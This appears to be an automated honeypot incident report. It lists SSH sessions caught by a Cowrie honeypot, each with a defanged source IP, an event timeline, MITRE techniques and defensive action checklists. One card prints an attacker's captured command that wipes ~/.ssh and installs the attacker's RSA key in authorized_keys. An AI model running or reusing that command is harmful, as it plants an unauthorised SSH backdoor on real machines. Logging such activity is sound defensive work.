### 🔴 HIGH · IR-d7f484038254

| Field | Detail |
|---|---|
| **Source IP** | `108.234.110[.]202` |
| **First Seen** | 2026-08-29 18:58 |
| **Last Seen** | 2026-08-29 18:58 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:58:16` | `cowrie.session.connect` |
| `2026-08-29 18:58:18` | `cowrie.client.version` |
| `2026-08-29 18:58:18` | `cowrie.client.kex` |
| `2026-08-29 18:58:24` | `cowrie.login.success` |
| `2026-08-29 18:58:26` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.234.110[.]202` to AbuseIPDB if not already reported
- [ ] Block `108.234.110[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-850c5aac19fd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:05 |
| **Last Seen** | 2026-08-29 19:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:05:16` | `cowrie.session.connect` |
| `2026-08-29 19:05:16` | `cowrie.client.version` |
| `2026-08-29 19:05:16` | `cowrie.client.kex` |
| `2026-08-29 19:05:17` | `cowrie.login.success` |
| `2026-08-29 19:05:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:05:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:05:18` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d7a9d5654d3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:07 |
| **Last Seen** | 2026-08-29 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:07:48` | `cowrie.session.connect` |
| `2026-08-29 19:07:48` | `cowrie.client.version` |
| `2026-08-29 19:07:48` | `cowrie.client.kex` |
| `2026-08-29 19:07:49` | `cowrie.login.success` |
| `2026-08-29 19:07:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:07:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:07:49` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:07:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1af244197f7

| Field | Detail |
|---|---|
| **Source IP** | `202.53.94[.]242` |
| **First Seen** | 2026-08-29 19:07 |
| **Last Seen** | 2026-08-29 19:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:07:56` | `cowrie.session.connect` |
| `2026-08-29 19:07:56` | `cowrie.client.version` |
| `2026-08-29 19:07:56` | `cowrie.client.kex` |
| `2026-08-29 19:07:58` | `cowrie.login.success` |
| `2026-08-29 19:07:58` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.53.94[.]242` to AbuseIPDB if not already reported
- [ ] Block `202.53.94[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53768747774

| Field | Detail |
|---|---|
| **Source IP** | `220.180.166[.]214` |
| **First Seen** | 2026-08-29 19:08 |
| **Last Seen** | 2026-08-29 19:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:08:03` | `cowrie.session.connect` |
| `2026-08-29 19:08:04` | `cowrie.client.version` |
| `2026-08-29 19:08:04` | `cowrie.client.kex` |
| `2026-08-29 19:08:06` | `cowrie.login.success` |
| `2026-08-29 19:08:07` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.166[.]214` to AbuseIPDB if not already reported
- [ ] Block `220.180.166[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5e0d75bcde

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:16 |
| **Last Seen** | 2026-08-29 19:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:16:22` | `cowrie.session.connect` |
| `2026-08-29 19:16:22` | `cowrie.client.version` |
| `2026-08-29 19:16:22` | `cowrie.client.kex` |
| `2026-08-29 19:16:23` | `cowrie.login.success` |
| `2026-08-29 19:16:23` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:16:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:16:23` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d89993d8ab3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:17 |
| **Last Seen** | 2026-08-29 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:17:41` | `cowrie.session.connect` |
| `2026-08-29 19:17:41` | `cowrie.client.version` |
| `2026-08-29 19:17:41` | `cowrie.client.kex` |
| `2026-08-29 19:17:42` | `cowrie.login.success` |
| `2026-08-29 19:17:42` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:17:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:17:42` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ff3d556f48a

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 19:19 |
| **Last Seen** | 2026-08-29 19:20 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:19:46` | `cowrie.session.connect` |
| `2026-08-29 19:19:46` | `cowrie.client.version` |
| `2026-08-29 19:19:46` | `cowrie.client.kex` |
| `2026-08-29 19:19:46` | `cowrie.login.success` |
| `2026-08-29 19:19:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:19:48` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 19:19:48` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39144811bba1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]170` |
| **First Seen** | 2026-08-29 19:23 |
| **Last Seen** | 2026-08-29 19:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:23:25` | `cowrie.session.connect` |
| `2026-08-29 19:23:25` | `cowrie.client.version` |
| `2026-08-29 19:23:25` | `cowrie.client.kex` |
| `2026-08-29 19:23:26` | `cowrie.login.success` |
| `2026-08-29 19:23:27` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]170` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33562c61a5a7

| Field | Detail |
|---|---|
| **Source IP** | `85.164.15[.]194` |
| **First Seen** | 2026-08-29 19:23 |
| **Last Seen** | 2026-08-29 19:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:23:32` | `cowrie.session.connect` |
| `2026-08-29 19:23:32` | `cowrie.client.version` |
| `2026-08-29 19:23:33` | `cowrie.client.kex` |
| `2026-08-29 19:23:33` | `cowrie.login.success` |
| `2026-08-29 19:23:33` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.164.15[.]194` to AbuseIPDB if not already reported
- [ ] Block `85.164.15[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f361fdd41e5d

| Field | Detail |
|---|---|
| **Source IP** | `120.238.23[.]168` |
| **First Seen** | 2026-08-29 19:24 |
| **Last Seen** | 2026-08-29 19:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:24:59` | `cowrie.session.connect` |
| `2026-08-29 19:25:01` | `cowrie.client.version` |
| `2026-08-29 19:25:01` | `cowrie.client.kex` |
| `2026-08-29 19:25:05` | `cowrie.login.success` |
| `2026-08-29 19:25:06` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.238.23[.]168` to AbuseIPDB if not already reported
- [ ] Block `120.238.23[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d957bd189002

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-08-29 19:25 |
| **Last Seen** | 2026-08-29 19:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:25:11` | `cowrie.session.connect` |
| `2026-08-29 19:25:12` | `cowrie.client.version` |
| `2026-08-29 19:25:12` | `cowrie.client.kex` |
| `2026-08-29 19:25:15` | `cowrie.login.success` |
| `2026-08-29 19:25:16` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79e21b108d4f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:27 |
| **Last Seen** | 2026-08-29 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:27:13` | `cowrie.session.connect` |
| `2026-08-29 19:27:13` | `cowrie.client.version` |
| `2026-08-29 19:27:13` | `cowrie.client.kex` |
| `2026-08-29 19:27:14` | `cowrie.login.success` |
| `2026-08-29 19:27:14` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:27:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:27:14` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-125ce347f8ae

| Field | Detail |
|---|---|
| **Source IP** | `182.52.133[.]240` |
| **First Seen** | 2026-08-29 19:27 |
| **Last Seen** | 2026-08-29 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:27:13` | `cowrie.session.connect` |
| `2026-08-29 19:27:14` | `cowrie.client.version` |
| `2026-08-29 19:27:14` | `cowrie.client.kex` |
| `2026-08-29 19:27:16` | `cowrie.login.success` |
| `2026-08-29 19:27:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.133[.]240` to AbuseIPDB if not already reported
- [ ] Block `182.52.133[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f580595b0095

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:27 |
| **Last Seen** | 2026-08-29 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:27:15` | `cowrie.session.connect` |
| `2026-08-29 19:27:15` | `cowrie.client.version` |
| `2026-08-29 19:27:16` | `cowrie.client.kex` |
| `2026-08-29 19:27:16` | `cowrie.login.success` |
| `2026-08-29 19:27:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:27:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:27:17` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af42f236bd8d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-29 19:27 |
| **Last Seen** | 2026-08-29 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:27:18` | `cowrie.session.connect` |
| `2026-08-29 19:27:18` | `cowrie.client.version` |
| `2026-08-29 19:27:18` | `cowrie.client.kex` |
| `2026-08-29 19:27:19` | `cowrie.login.success` |
| `2026-08-29 19:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632676401b84

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-29 19:27 |
| **Last Seen** | 2026-08-29 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:27:18` | `cowrie.session.connect` |
| `2026-08-29 19:27:18` | `cowrie.client.version` |
| `2026-08-29 19:27:18` | `cowrie.client.kex` |
| `2026-08-29 19:27:19` | `cowrie.login.success` |
| `2026-08-29 19:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a9e7bfb5e3

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-08-29 19:27 |
| **Last Seen** | 2026-08-29 19:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:27:22` | `cowrie.session.connect` |
| `2026-08-29 19:27:22` | `cowrie.client.version` |
| `2026-08-29 19:27:22` | `cowrie.client.kex` |
| `2026-08-29 19:27:24` | `cowrie.login.success` |
| `2026-08-29 19:27:24` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-155dfa0ff8f0

| Field | Detail |
|---|---|
| **Source IP** | `211.23.109[.]116` |
| **First Seen** | 2026-08-29 19:27 |
| **Last Seen** | 2026-08-29 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:27:26` | `cowrie.session.connect` |
| `2026-08-29 19:27:27` | `cowrie.client.version` |
| `2026-08-29 19:27:27` | `cowrie.client.kex` |
| `2026-08-29 19:27:29` | `cowrie.login.success` |
| `2026-08-29 19:27:29` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.23.109[.]116` to AbuseIPDB if not already reported
- [ ] Block `211.23.109[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b281e700c893

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]236` |
| **First Seen** | 2026-08-29 19:27 |
| **Last Seen** | 2026-08-29 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:27:35` | `cowrie.session.connect` |
| `2026-08-29 19:27:36` | `cowrie.client.version` |
| `2026-08-29 19:27:36` | `cowrie.client.kex` |
| `2026-08-29 19:27:38` | `cowrie.login.success` |
| `2026-08-29 19:27:38` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]236` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d8ac3fde683

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-08-29 19:29 |
| **Last Seen** | 2026-08-29 19:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:29:57` | `cowrie.session.connect` |
| `2026-08-29 19:29:58` | `cowrie.client.version` |
| `2026-08-29 19:29:58` | `cowrie.client.kex` |
| `2026-08-29 19:30:00` | `cowrie.login.success` |
| `2026-08-29 19:30:00` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c48388faff28

| Field | Detail |
|---|---|
| **Source IP** | `185.40.122[.]250` |
| **First Seen** | 2026-08-29 19:30 |
| **Last Seen** | 2026-08-29 19:30 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:30:08` | `cowrie.session.connect` |
| `2026-08-29 19:30:08` | `cowrie.client.version` |
| `2026-08-29 19:30:08` | `cowrie.client.kex` |
| `2026-08-29 19:30:15` | `cowrie.login.success` |
| `2026-08-29 19:30:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.40.122[.]250` to AbuseIPDB if not already reported
- [ ] Block `185.40.122[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b994e14f7bfa

| Field | Detail |
|---|---|
| **Source IP** | `103.159.54[.]61` |
| **First Seen** | 2026-08-29 19:35 |
| **Last Seen** | 2026-08-29 19:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:35:55` | `cowrie.session.connect` |
| `2026-08-29 19:35:55` | `cowrie.client.version` |
| `2026-08-29 19:35:56` | `cowrie.client.kex` |
| `2026-08-29 19:35:57` | `cowrie.login.success` |
| `2026-08-29 19:35:58` | `cowrie.session.params` |
| `2026-08-29 19:35:58` | `cowrie.command.input` |
| `2026-08-29 19:35:58` | `cowrie.command.failed` |
| `2026-08-29 19:35:58` | `cowrie.log.closed` |
| `2026-08-29 19:35:59` | `cowrie.session.params` |
| `2026-08-29 19:35:59` | `cowrie.command.input` |
| `2026-08-29 19:35:59` | `cowrie.session.file_download` |
| `2026-08-29 19:35:59` | `cowrie.log.closed` |
| `2026-08-29 19:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.54[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.159.54[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f8ec9606e3

| Field | Detail |
|---|---|
| **Source IP** | `103.159.54[.]61` |
| **First Seen** | 2026-08-29 19:36 |
| **Last Seen** | 2026-08-29 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:36:00` | `cowrie.session.connect` |
| `2026-08-29 19:36:00` | `cowrie.client.version` |
| `2026-08-29 19:36:00` | `cowrie.client.kex` |
| `2026-08-29 19:36:01` | `cowrie.login.success` |
| `2026-08-29 19:36:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.54[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.159.54[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec1efbb5ae5

| Field | Detail |
|---|---|
| **Source IP** | `103.159.54[.]61` |
| **First Seen** | 2026-08-29 19:36 |
